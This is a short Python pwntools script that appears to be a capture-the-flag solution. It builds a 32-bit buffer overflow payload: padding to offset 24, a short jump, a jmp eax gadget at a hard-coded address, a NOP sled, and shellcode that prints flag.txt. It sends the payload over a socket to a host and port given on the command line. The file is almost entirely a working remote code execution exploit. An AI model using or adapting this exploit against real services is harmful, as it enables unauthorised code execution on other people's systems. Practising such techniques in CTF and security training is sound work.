#!/usr/bin/env/python3

import argparse
import socket
import struct
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The host address to connect to")
parser.add_argument("port", type=int, help="The port to connect to")

args = parser.parse_args()

offset = 24
jmp_eax = p32(0x0805334B)
short_jmp = b"\xeb\x08\x90\x90"
rce = asm(shellcraft.i386.linux.cat("flag.txt"))


payload = [b"A" * offset, short_jmp, jmp_eax, b"\x90" * 24, rce, b"\n"]
payload = b"".join(payload)
open("payload", "wb").write(payload)
print(payload)

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(2048).decode("utf-8"))
    connection.send(payload)
    print(connection.recv(2048))

# 08049296
